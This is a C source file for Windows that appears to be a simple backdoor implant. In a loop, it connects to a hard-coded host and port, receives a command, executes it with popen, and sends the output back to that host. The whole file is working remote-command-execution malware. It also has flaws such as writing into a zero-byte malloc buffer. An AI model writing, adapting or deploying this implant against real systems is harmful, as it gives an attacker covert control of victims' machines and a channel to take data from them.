#include <stdio.h>
#include <winsock2.h>
#include <windows.h>


#define LEN_MSG 256
#define HOST "192.168.56.1"
#define PORT 13337
#define SLEEPTIME 2000


SOCKET connectToServer() {
    SOCKET serverSocketFd;
    struct sockaddr_in serverHost;
    WSADATA WSAData;

    WSAStartup(MAKEWORD(2,0), &WSAData);

    serverSocketFd = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocketFd == INVALID_SOCKET) {
        printf("Error while creating socket. (%d)\n", WSAGetLastError());
        closesocket(serverSocketFd);  // is this right ? i don't know it might make a segfault
        return SOCKET_ERROR;
    }

    serverHost.sin_family = AF_INET;
    serverHost.sin_port = htons(PORT);  // to little endian
    serverHost.sin_addr.s_addr = inet_addr(HOST);

    int result = connect(serverSocketFd, (SOCKADDR *) &serverHost, sizeof(serverHost));
    if (result == SOCKET_ERROR) {
        printf("Error while creating socket. (%d)\n", WSAGetLastError());
        closesocket(serverSocketFd);
        return SOCKET_ERROR;
    }

    u_long mode = 1;
    ioctlsocket(serverSocketFd, FIONBIO, &mode);

    return serverSocketFd;
}


int pull(char* message) {
    SOCKET serverFd = connectToServer();
    if (serverFd == SOCKET_ERROR) {
        WSACleanup();
        return WSAGetLastError();
    }

    Sleep(10);  // Sleeping for 10 milliseconds to let the tcp connection complete before reading
                // so we avoid errors like WOULDBLOCK.
    int readBytes = recv(serverFd, message, LEN_MSG, 0);
    if (readBytes < 0) {
        closesocket(serverFd);
        WSACleanup();
        return WSAGetLastError();
    }

    closesocket(serverFd);
    return 0;
}


int sendData(char* message) {
    SOCKET serverFd = connectToServer();
    if (serverFd == SOCKET_ERROR) {
        WSACleanup();
        return WSAGetLastError();
    }

    int byteSent = send(serverFd, message, (int)strlen(message), 0);
    if (byteSent != (int)strlen(message)) {
        closesocket(serverFd);
        WSACleanup();
        return WSAGetLastError();
    }

    closesocket(serverFd);
    return 0;
}

char* execute(char* command) {
    FILE* exec = popen(command, "r");
    if (exec == NULL) {
        return NULL;
    }

    char currLine[256] = { 0x00 };

    // this var will store the entire output. Since we don't know the size of the output
    // yet, we create an empty dynamic string.
    char* response_h = malloc(0);
    response_h[0] = 0;

    size_t readBytes;
    size_t newSize;

    while ((readBytes = fread(currLine, 1, sizeof(currLine), exec)) != 0x00) {
        // each time there's something to read, we update the new size of the response_h buffer
        // current + new data + 1. 1 is for the null byte we add at the end of it.
        // The null byte will be overwritten next loop or stays if the loops ends.
        newSize = strlen(response_h) + readBytes + 1;

        // potential memory leak if realloc return NULL because we lose access to the original
        // response_h buffer. It's not a problem since we're exiting if it can't allocate space
        // (should never happen, if it happens there's shit going on)
        response_h = realloc(response_h, newSize);
        if (response_h == NULL) {
            return NULL;
        }

        // Note: strcpy would do the job here
        strncpy(response_h + strlen(response_h), currLine, readBytes);
        response_h[newSize - 1] = 0x0;
    }

    pclose(exec);
    return response_h;
}


int main() {
    char message[LEN_MSG] = { 0x0 };

    while (1) {
        int error = pull(message);
        if (error != 0) {
            printf("Error while pulling data. (%d)", error);
            exit(EXIT_FAILURE);
        }

        char* command_h = execute(message);
        if (command_h == NULL) {
            // if we reach this point, there's some shit going on.
            printf("Could not execute command.");
            exit(EXIT_FAILURE);
        }

        error = sendData(command_h);
        if (error != 0) {
            printf("Error while pulling data. (%d)", error);
            exit(EXIT_FAILURE);
        }

        free(command_h);
        memset(message, 0x00, sizeof(message));
        Sleep(SLEEPTIME);
    }
}